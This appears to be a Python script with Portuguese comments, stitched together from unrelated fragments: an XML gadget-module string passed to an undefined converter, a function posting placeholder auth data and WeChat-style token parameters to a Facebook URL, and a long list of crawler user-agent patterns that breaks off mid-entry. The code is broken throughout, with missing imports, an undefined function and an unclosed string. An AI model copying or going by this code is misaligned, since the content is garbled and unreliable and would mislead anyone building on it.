xml_data = '''<?xml version="1.0" encoding="UTF-8" ?>
<Module>
  <ModulePrefs title="Starter App">
    <Require feature="rpc"/>
  </ModulePrefs>
  <Content type="html"><![CDATA[
<!DOCTYPE html>
  <script src="//hangoutsapi.talkgadget.google.com/hangouts/api/hangout.js?v=1.1"></script>

  <!-- // production
    <script src="https://your-unique-identifier.appspot.com/static/app.js"></script>
  -->

  <script src="http://ajax.googleapis.com/ajax/libs/jquery/1.7/jquery.min.js"></script>
  <link rel="manifest" id="MANIFEST_LINK" src="https://www.gstatic.com/firebasejs/6.2.4/firebase-app.js" crossorigin="use-credentials" />
  <script src="https://www.gstatic.com/firebasejs/6.2.4/firebase-firestore.js"></script>
]]></Content>
</Module>'''

# Convertendo e imprimindo em JSON formatado
json_output = xml_to_json(xml_data)
print(json.dumps(json_output, indent=2))
def enviar_requisicao_facebook(token_params, auth_payload):
    # Construir a URL com os parâmetros fornecidos
    full_url = f"https://m.facebook.com/?skey={token_params['skey']}&deviceid={token_params['deviceid']}&pass_ticket={token_params['pass_ticket']}"

    # Cabeçalhos da requisição
    headers = {
        "Content-Type": "application/json"
    }

    # Convertendo o payload para JSON
    data = json.dumps(auth_payload)

    # Realizando a requisição POST
    response = requests.post(full_url, headers=headers, data=data)

    # Verificando e imprimindo a resposta da requisição
    if response.status_code == 200:
        print("Requisição bem-sucedida!")
        print("Resposta:", response.text)
    else:
        print(f"Erro na requisição: {response.status_code}")

# Parâmetros do token
token_params = {
    "skey": "@crypt_efe68487_9689b1628dd3d53b0f9723db80b78cc5",
    "deviceid": "e151159721769276",
    "pass_ticket": "undefine"
}

# Dados para autenticação (payload)
auth_payload = {
    "uid": "1",
    "auth_data": "foo",
    "other_auth_data": "bar"
}

# Chamar a função para enviar a requisição
enviar_requisicao_facebook(token_params, auth_payload)
# Definindo a variável json_data com um texto comentado
json_data = '''[
  {
    "pattern": "Googlebot\\/",
    "url": "http://www.google.com/bot.html",
    "instances": [
      "Googlebot/2.1 (+http://www.google.com/bot.html)",
      "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F70 Safari/600.1.4 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.1453 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "Googlebot-Mobile",
    "instances": [
      "DoCoMo/2.0 N905i(c100;TB;W24H16) (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
      "Nokia6820/2.0 (4.83) Profile/MIDP-1.0 Configuration/CLDC-1.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)",
      "SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "Googlebot-Image",
    "instances": [
      "Googlebot-Image/1.0"
    ]
  }
  ,
  {
    "pattern": "Googlebot-News",
    "instances": [
      "Googlebot-News"
    ]
  }
  ,
  {
    "pattern": "Googlebot-Video",
    "instances": [
      "Googlebot-Video/1.0"
    ]
  }
  ,
  {
    "pattern": "AdsBot-Google([^-]|$)",
    "url": "https://support.google.com/webmasters/answer/1061943?hl=en",
    "instances": [
      "AdsBot-Google (+http://www.google.com/adsbot.html)"
    ]
  }
  ,
  {
    "pattern": "AdsBot-Google-Mobile",
    "addition_date": "2017/08/21",
    "url": "https://support.google.com/adwords/answer/2404197",
    "instances": [
      "AdsBot-Google-Mobile-Apps",
      "Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)"
    ]
  }
  ,
  {
    "pattern": "Feedfetcher-Google",
    "addition_date": "2018/06/27",
    "url": "https://support.google.com/webmasters/answer/178852",
    "instances": [
      "Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=728742641706423)"
    ]
  }
  ,
  {
    "pattern": "Mediapartners-Google",
    "url": "https://support.google.com/webmasters/answer/1061943?hl=en",
    "instances": [
      "Mediapartners-Google",
      "Mozilla/5.0 (compatible; MSIE or Firefox mutant; not on Windows server;) Daumoa/4.0 (Following Mediapartners-Google)",
      "Mozilla/5.0 (iPhone; U; CPU iPhone OS 10_0 like Mac OS X; en-us) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A5297c Safari/602.1 (compatible; Mediapartners-Google/2.1; +http://www.google.com/bot.html)",
      "Mozilla/5.0 (iPhone; U; CPU iPhone OS 4_1 like Mac OS X; en-us) AppleWebKit/532.9 (KHTML, like Gecko) Version/4.0.5 Mobile/8B117 Safari/6531.22.7 (compatible; Mediapartners-Google/2.1; +http://www.google.com/bot.html)"
    ]
  }
  ,
  {
    "pattern": "Mediapartners \\(Googlebot\\)",
    "addition_date": "2017/08/08",
    "url": "https://support.google.com/webmasters/answer/1061943?hl=en",
    "instances": []
  }
  ,
  {
    "pattern": "APIs-Google",
    "addition_date": "2017/08/08",
    "url": "https://support.google.com/webmasters/answer/1061943?hl=en",
    "instances": [
      "APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)"
    ]
  }
  ,
  {
    "pattern": "bingbot",
    "url": "http://www.bing.com/bingbot.htm",
    "instances": [
      "Mozilla/5.0 (Windows Phone 8.1; ARM; Trident/7.0; Touch; rv:11.0; IEMobile/11.0; NOKIA; Lumia 530) like Gecko (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (compatible; adidxbot/2.0;  http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm",
      "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) SitemapProbe",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; adidxbot/2.0;  http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; adidxbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0;  http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 (seoanalyzer; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
      "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Safari/537.36"
    ]
  }
  ,
  {
    "pattern": "Slurp",
    "url": "http://help.yahoo.com/help/us/ysearch/slurp",
    "instances": [
      "Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)",
      "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
      "Mozilla/5.0 (compatible; Yahoo! Slurp China; http://misc.yahoo.com.cn/help.html)"
    ]
  }
  ,
  {
    "pattern": "[wW]get",
    "instances": [
      "WGETbot/1.0 (+http://wget.alanreed.org)",
      "Wget/1.14 (linux-gnu)",
      "Wget/1.20.3 (linux-gnu)"
    ]
  }
  ,
  {
    "pattern": "LinkedInBot",
    "instances": [
      "LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta Commons-HttpClient/3.1 +http://www.linkedin.com)",
      "LinkedInBot/1.0 (compatible; Mozilla/5.0; Jakarta Commons-HttpClient/4.3 +http://www.linkedin.com)",
      "LinkedInBot/1.0 (compatible; Mozilla/5.0; Apache-HttpClient +http://www.linkedin.com)"
    ]
  }
  ,
  {
    "pattern": "Python-urllib",
    "instances": [
      "Python-urllib/1.17",
      "Python-urllib/2.5",
      "Python-urllib/2.6",
      "Python-urllib/2.7",
      "Python-urllib/3.1",
      "Python-urllib/3.2",
      "Python-urllib/3.3",
      "Python-urllib/3.4",
      "Python-urllib/3.5",
      "Python-urllib/3.6",
      "Python-urllib/3.7"
     ]
  }
  ,
  {
    "pattern": "python-requests",
    "addition_date": "2018/05/27",
    "instances": [
      "python-requests/2.9.2",
      "python-requests/2.11.1",
      "python-requests/2.18.4",
      "python-requests/2.19.1",
      "python-requests/2.20.0",
      "python-requests/2.21.0",
      "python-requests/2.22.0"
    ]
  }
  ,
  {
    "pattern": "libwww-perl",
    "instances": [
      "2Bone_LinkChecker/1.0 libwww-perl/6.03",
      "2Bone_LinkChkr/1.0 libwww-perl/6.03",
      "amibot - http://www.amidalla.de - tech@amidalla.com libwww-perl/5.831"
    ]
  }
  ,
  {
    "pattern": "httpunit",
    "instances": [
      "httpunit/1.x"
    ]
  }
  ,
  {
    "pattern": "nutch",
    "instances": [
      "NutchCVS/0.7.1 (Nutch; http://lucene.apache.org/nutch/bot.html; nutch-agent@lucene.apache.org)",
      "istellabot-nutch/Nutch-1.10"
    ]
  }
  ,
  {
    "pattern": "Go-http-client",
    "addition_date": "2016/03/26",
    "url": "https://golang.org/pkg/net/http/",
    "instances": [
      "Go-http-client/1.1",
      "Go-http-client/2.0"
    ]
  }
  ,
  {
    "pattern": "phpcrawl",
    "addition_date": "2012-09/17",
    "url": "http://phpcrawl.cuab.de/",
    "instances": [
      "phpcrawl"
    ]
  }
  ,
  {
    "pattern": "msnbot",
    "url": "http://search.msn.com/msnbot.htm",
    "instances": [
      "adidxbot/1.1 (+http://search.msn.com/msnbot.htm)",
      "adidxbot/2.0 (+http://search.msn.com/msnbot.htm)",
      "librabot/1.0 (+http://search.msn.com/msnbot.htm)",
      "librabot/2.0 (+http://search.msn.com/msnbot.htm)",
      "msnbot-NewsBlogs/2.0b (+http://search.msn.com/msnbot.htm)",
      "msnbot-UDiscovery/2.0b (+http://search.msn.com/msnbot.htm)",
      "msnbot-media/1.0 (+http://search.msn.com/msnbot.htm)",
      "msnbot-media/1.1 (+http://search.msn.com/msnbot.htm)",
      "msnbot-media/2.0b (+http://search.msn.com/msnbot.htm)",
      "msnbot/1.0 (+http://search.msn.com/msnbot.htm)",
      "msnbot/1.1 (+http://search.msn.com/msnbot.htm)",
      "msnbot/2.0b (+http://search.msn.com/msnbot.htm)",
      "msnbot/2.0b (+http://search.msn.com/msnbot.htm).",
      "msnbot/2.0b (+http://search.msn.com/msnbot.htm)._"
    ]
  }
  ,
  {
    "pattern": "jyxobot",
    "instances": []
  }
  ,
  {
    "pattern": "FAST-WebCrawler",
    "instances": [
      "FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
      "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)",
      "FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)",
      "FAST-WebCrawler/3.8"
    ]
  }
  ,
  {
    "pattern": "FAST Enterprise Crawler",
    "instances": [
      "FAST Enterprise Crawler 6 / Scirus scirus-crawler@fast.no; http://www.scirus.com/srsapp/contactus/",
      "FAST Enterprise Crawler 6 used by Schibsted (webcrawl@schibstedsok.no)"
    ]
  }
  ,
  {
    "pattern": "BIGLOTRON",
    "instances": [
      "BIGLOTRON (Beta 2;GNU/Linux)"
    ]
  }
  ,
  {
    "pattern": "Teoma",
    "instances": [
      "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)",
      "Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)"
    ],
    "url": "http://about.ask.com/en/docs/about/webmasters.shtml"
  }
  ,
  {
    "pattern": "convera",
    "instances": [
      "ConveraCrawler/0.9e (+http://ews.converasearch.com/crawl.htm)"
    ],
    "url": "http://ews.converasearch.com/crawl.htm"
  }
  ,
  {
    "pattern": "seekbot",
    "instances": [
      "Seekbot/1.0 (http://www.seekbot.net/bot.html) RobotsTxtFetcher/1.2"
    ],
    "url": "http://www.seekbot.net/bot.html"
  }
  ,
  {
    "pattern": "Gigabot",
    "instances": [
      "Gigabot/1.0",
      "Gigabot/2.0 (http://www.gigablast.com/spider.html)"
    ],
    "url": "http://www.gigablast.com/spider.html"
  }
  ,
  {
    "pattern": "Gigablast",
    "instances": [
      "GigablastOpenSource/1.0"
    ],
    "url": "https://github.com/gigablast/open-source-search-engine"
  }
  ,
  {
    "pattern": "exabot",
    "instances": [
      "Mozilla/5.0 (compatible; Alexabot/1.0; +http://www.alexa.com/help/certifyscan; certifyscan@alexa.com)",
      "Mozilla/5.0 (compatible; Exabot PyExalead/3.0; +http://www.exabot.com/go/robot)",
      "Mozilla/5.0 (compatible; Exabot-Images/3.0; +http://www.exabot.com/go/robot)",
      "Mozilla/5.0 (compatible; Exabot/3.0 (BiggerBetter); +http://www.exabot.com/go/robot)",
      "Mozilla/5.0 (compatible; Exabot/3.0; +http://www.exabot.com/go/robot)",
      "Mozilla/5.0 (compatible; Exabot/3.0;  http://www.exabot.com/go/robot)"
    ]
  }
  ,
  {
    "pattern": "ia_archiver",
    "instances": [
      "ia_archiver (+http://www.alexa.com/site/help/webmasters; crawler@alexa.com)",
      "ia_archiver-web.archive.org"
    ]
  }
  ,
  {
    "pattern": "GingerCrawler",
    "instances": [
      "GingerCrawler/1.0 (Language Assistant for Dyslexics; www.gingersoftware.com/crawler_agent.htm; support at ginger software dot com)"
    ]
  }
  ,
  {
    "pattern": "webmon ",
    "instances": []
  }
  ,
  {
    "pattern": "HTTrack",
    "instances": [
      "Mozilla/4.5 (compatible; HTTrack 3.0x; Windows 98)"
    ]
  }
  ,
  {
    "pattern": "grub.org",
    "instances": [
      "Mozilla/4.0 (compatible; grub-client-0.3.0; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.0.4; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.0.5; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.0.6; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.0.7; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.1.1; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.2.1; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.3.1; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.3.7; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.4.3; Crawl your own stuff with http://grub.org)",
      "Mozilla/4.0 (compatible; grub-client-1.5.3; Crawl your own stuff with http://grub.org)"
    ]
  }
  ,
  {
    "pattern": "UsineNouvelleCrawler",
    "instances": []
  }
  ,
  {
    "pattern": "antibot",
    "instances": []
  }
  ,
  {
    "pattern": "netresearchserver",
    "instances": []
  }
  ,
  {
    "pattern": "speedy",
    "instances": [
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) Speedy Spider (http://www.entireweb.com/about/search_tech/speedy_spider/)",
      "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) Speedy Spider for SpeedyAds (http://www.entireweb.com/about/search_tech/speedy_spider/)",
      "Mozilla/5.0 (compatible; Speedy Spider; http://www.entireweb.com/about/search_tech/speedy_spider/)",
      "Speedy Spider (Entireweb; Beta/1.2; http://www.entireweb.com/about/search_tech/speedyspider/)",
      "Speedy Spider (http://www.entireweb.com/about/search_tech/speedy_spider/)"
    ]
  }
  ,
  {
    "pattern": "fluffy",
    "instances": []
  }
  ,
  {
    "pattern": "findlink",
    "instances": [
      "findlinks/1.0 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.3-beta8 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.3-beta9 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/; YaCy 0.1; yacy.net)",
      "findlinks/1.1.6-beta2 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta3 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta5 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0.2 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0.4 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0.5 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.0.9 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.1 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.1.3 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.1.5 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.2 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.5 (+http://wortschatz.uni-leipzig.de/findlinks/)",
      "findlinks/2.6 (+http://wortschatz.uni-leipzig.de/findlinks/)"
    ]
  }
  ,
  {
    "pattern": "msrbot",
    "instances": []
  }
  ,
  {
    "pattern": "panscient",
    "instances": [
      "panscient.com"
    ]
  }
  ,
  {
    "pattern": "yacybot",
    "instances": [
      "yacybot (/global; amd64 FreeBSD 10.3-RELEASE; java 1.8.0_77; GMT/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 FreeBSD 10.3-RELEASE-p7; java 1.7.0_95; GMT/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 FreeBSD 9.2-RELEASE-p10; java 1.7.0_65; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 2.6.32-042stab093.4; java 1.7.0_65; Etc/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 2.6.32-042stab094.8; java 1.7.0_79; America/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 2.6.32-042stab108.8; java 1.7.0_91; America/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 2.6.32-042stab111.11; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 2.6.32-042stab116.1; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 2.6.32-573.3.1.el6.x86_64; java 1.7.0_85; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.10.0-229.4.2.el7.x86_64; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.10.0-229.4.2.el7.x86_64; java 1.8.0_45; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.10.0-229.7.2.el7.x86_64; java 1.8.0_45; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.10.0-327.22.2.el7.x86_64; java 1.7.0_101; Etc/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.11.10-21-desktop; java 1.7.0_51; America/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.12.1; java 1.7.0_65; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-042stab093.4; java 1.7.0_79; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-042stab093.4; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-45-generic; java 1.7.0_75; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.13.0-61-generic; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-74-generic; java 1.7.0_91; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-83-generic; java 1.7.0_95; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-83-generic; java 1.7.0_95; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-85-generic; java 1.7.0_101; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-85-generic; java 1.7.0_95; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.13.0-88-generic; java 1.7.0_101; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.14-0.bpo.1-amd64; java 1.7.0_55; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.14.32-xxxx-grs-ipv6-64; java 1.7.0_75; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.14.32-xxxx-grs-ipv6-64; java 1.8.0_111; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_111; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_75; America/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_75; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_75; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_79; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_79; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_91; Europe/de) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.7.0_95; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16.0-4-amd64; java 1.8.0_111; Europe/en) http://yacy.net/bot.html",
      "yacybot (/global; amd64 Linux 3.16-0.bpo.2-amd64; java 1.7.0_65; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.19.0-15-generic; java 1.8.0_45-internal; Europe/de) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.2.0-4-amd64; java 1.7.0_65; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 3.2.0-4-amd64; java 1.7.0_67; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 4.4.0-57-generic; java 9-internal; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Windows 8.1 6.3; java 1.7.0_55; Europe/de) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Windows 8 6.2; java 1.7.0_55; Europe/de) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 5.2.8-Jinsol; java 12.0.2; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 5.2.9-Jinsol; java 12.0.2; Europe/en) http://yacy.net/bot.html",
      "yacybot (-global; amd64 Linux 5.2.11-Jinsol; java 12.0.2; Europe/en) http://yacy.net/bot.html"
    ]
  }
  ,
  {
    "pattern": "AISearchBot",
    "instances": []
  }
  ,
  {
    "pattern": "ips-agent",
    "instances": [
      "BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 ips-agent",
      "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12; ips-agent) Gecko/20050922 Fedora/1.0.7-1.1.fc4 Firefox/1.0.7",
      "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.3; ips-agent) Gecko/20090824 Fedora/1.0.7-1.1.fc4  Firefox/3.5.3",
      "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.2.24; ips-agent) Gecko/20111107 Ubuntu/10.04 (lucid) Firefox/3.6.24",
      "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0; ips-agent) Gecko/20100101 Firefox/14.0.1"
    ]
  }
  ,
  {
    "pattern": "tagoobot",
    "instances": []
  }
  ,
  {
    "pattern": "MJ12bot",
    "instances": [
      "MJ12bot/v1.2.0 (http://majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.2.1; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.2.5; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.3.0; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.3.1; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.3.2; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.3.3; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.0; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.1; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.2; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.3; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.4 (domain ownership verifier); http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.4; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.6; http://mj12bot.com/)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://mj12bot.com/)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.7; http://www.majestic12.co.uk/bot.php?+)",
      "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)"
    ]
  }
  ,
  {
    "pattern": "woriobot",
    "instances": [
      "Mozilla/5.0 (compatible; woriobot +http://worio.com)",
      "Mozilla/5.0 (compatible; woriobot support [at] zite [dot] com +http://zite.com)"
    ]
  }
  ,
  {
    "pattern": "yanga",
    "instances": [
      "Yanga WorldSearch Bot v1.1/beta (http://www.yanga.co.uk/)"
    ]
  }
  ,
  {
